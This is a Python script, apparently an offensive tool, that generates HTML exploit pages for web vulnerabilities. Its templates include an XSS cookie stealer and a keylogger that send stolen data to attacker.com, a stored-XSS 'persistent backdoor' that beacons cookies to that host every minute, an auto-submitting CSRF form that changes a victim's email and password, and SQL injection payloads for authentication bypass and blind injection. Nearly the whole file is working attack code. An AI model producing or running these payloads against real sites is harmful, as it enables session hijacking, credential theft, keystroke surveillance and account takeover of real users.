#!/usr/bin/env python3
"""
Automated Exploit Generator
Generates working PoC exploits for discovered vulnerabilities
"""
import json
import base64
from datetime import datetime
from urllib.parse import quote

class ExploitGenerator:
    def __init__(self):
        self.exploit_templates = {
            'dom_xss': self.generate_dom_xss_exploit,
            'reflected_xss': self.generate_reflected_xss_exploit,
            'stored_xss': self.generate_stored_xss_exploit,
            'csrf': self.generate_csrf_exploit,
            'sql_injection': self.generate_sql_exploit,
        }
    
    def generate_dom_xss_exploit(self, vuln):
        """Generate DOM XSS exploit"""
        url = vuln.get('url', '')
        payload = vuln.get('payload', '<script>alert(1)</script>')
        
        exploits = []
        
        # 1. Cookie stealer
        cookie_stealer = f"""
<!-- DOM XSS Cookie Stealer -->
<html>
<head><title>Exploit PoC</title></head>
<body>
<h1>DOM XSS Exploit - Cookie Stealer</h1>
<script>
// Payload
var payload = '{payload}';
var targetUrl = '{url}' + '#' + payload;

// Steal cookies
var stolenCookie = document.cookie;
var exfilUrl = 'https://attacker.com/steal?cookie=' + encodeURIComponent(stolenCookie);

// Exfiltrate
var img = new Image();
img.src = exfilUrl;

// Redirect
window.location = targetUrl;
</script>
</body>
</html>
"""
        exploits.append({
            'type': 'Cookie Stealer',
            'code': cookie_stealer,
            'severity': 'CRITICAL'
        })
        
        # 2. Keylogger
        keylogger = f"""
<!-- DOM XSS Keylogger -->
<script>
var keys = '';
document.onkeypress = function(e) {{
    keys += String.fromCharCode(e.which);
    if (keys.length > 20) {{
        new Image().src = 'https://attacker.com/log?keys=' + encodeURIComponent(keys);
        keys = '';
    }}
}};
</script>
"""
        exploits.append({
            'type': 'Keylogger',
            'code': keylogger,
            'severity': 'HIGH'
        })
        
        return exploits
    
    def generate_reflected_xss_exploit(self, vuln):
        """Generate Reflected XSS exploit"""
        url = vuln.get('url', '')
        param = vuln.get('parameter', 'q')
        payload = vuln.get('payload', '<script>alert(1)</script>')
        
        exploits = []
        
        # Basic PoC
        basic_poc = f"""
<!-- Reflected XSS PoC -->
<html>
<head><title>XSS PoC</title></head>
<body>
<h1>Click the link to trigger XSS</h1>
<a href="{url}?{param}={quote(payload)}">Click Here</a>

<script>
setTimeout(function() {{
    window.location = "{url}?{param}={quote(payload)}";
}}, 2000);
</script>
</body>
</html>
"""
        exploits.append({
            'type': 'Basic PoC',
            'code': basic_poc,
            'url': f"{url}?{param}={quote(payload)}"
        })
        
        return exploits
    
    def generate_stored_xss_exploit(self, vuln):
        """Generate Stored XSS exploit"""
        exploits = []
        
        backdoor = """
<!-- Stored XSS Backdoor -->
<script>
(function() {
    setInterval(function() {
        fetch('https://attacker.com/beacon', {
            method: 'POST',
            body: JSON.stringify({
                cookies: document.cookie,
                url: window.location.href,
                timestamp: new Date().toISOString()
            })
        });
    }, 60000);
})();
</script>
"""
        exploits.append({
            'type': 'Persistent Backdoor',
            'code': backdoor,
            'severity': 'CRITICAL'
        })
        
        return exploits
    
    def generate_csrf_exploit(self, vuln):
        """Generate CSRF exploit"""
        url = vuln.get('url', '')
        
        csrf_exploit = f"""
<!-- CSRF Exploit -->
<html>
<body>
<h1>Loading...</h1>
<form id="csrfForm" action="{url}" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="password" value="hacked123">
</form>

<script>
document.getElementById('csrfForm').submit();
</script>
</body>
</html>
"""
        return [{
            'type': 'CSRF Attack',
            'code': csrf_exploit,
            'severity': 'HIGH'
        }]
    
    def generate_sql_exploit(self, vuln):
        """Generate SQL Injection exploit"""
        url = vuln.get('url', '')
        param = vuln.get('parameter', 'id')
        
        sql_exploit = f"""
<!-- SQL Injection Exploit -->
<html>
<body>
<h1>SQL Injection PoC</h1>
<p>Target: {url}</p>
<p>Parameter: {param}</p>

<h2>Test Payloads:</h2>
<ul>
    <li><a href="{url}?{param}=' OR '1'='1">Authentication Bypass</a></li>
    <li><a href="{url}?{param}=' UNION SELECT NULL--">Union-based</a></li>
    <li><a href="{url}?{param}=1' AND SLEEP(5)--">Time-based Blind</a></li>
</ul>
</body>
</html>
"""
        return [{
            'type': 'SQL Injection PoC',
            'code': sql_exploit,
            'severity': 'CRITICAL'
        }]
    
    def generate_exploit(self, vuln):
        """Generate exploit based on vulnerability type"""
        vuln_type = vuln.get('type', '').lower()
        
        for key, generator in self.exploit_templates.items():
            if key in vuln_type:
                return generator(vuln)
        
        # Default exploit
        return [{
            'type': 'Generic PoC',
            'code': f"<!-- Vulnerability: {vuln.get('type')} -->\n<!-- URL: {vuln.get('url')} -->",
            'severity': 'MEDIUM'
        }]
    
    def save_exploit(self, exploit, filename):
        """Save exploit to file"""
        import os
        os.makedirs('exploits', exist_ok=True)
        
        with open(filename, 'w') as f:
            f.write(exploit['code'])
        print(f"[+] Exploit saved: {filename}")

def main():
    print("""
    ╔═══════════════════════════════════════════════════╗
    ║   Automated Exploit Generator                    ║
    ║   Generates PoC exploits for vulnerabilities     ║
    ╚═══════════════════════════════════════════════════╝
    """)
    
    generator = ExploitGenerator()
    
    # Example vulnerability
    vuln = {
        'type': 'DOM XSS',
        'url': 'https://example.com/page',
        'payload': '<script>alert(1)</script>'
    }
    
    exploits = generator.generate_exploit(vuln)
    
    for i, exploit in enumerate(exploits, 1):
        print(f"\n[{i}] {exploit['type']} - {exploit.get('severity', 'MEDIUM')}")
        filename = f"exploits/exploit_{i}.html"
        generator.save_exploit(exploit, filename)

if __name__ == "__main__":
    main()
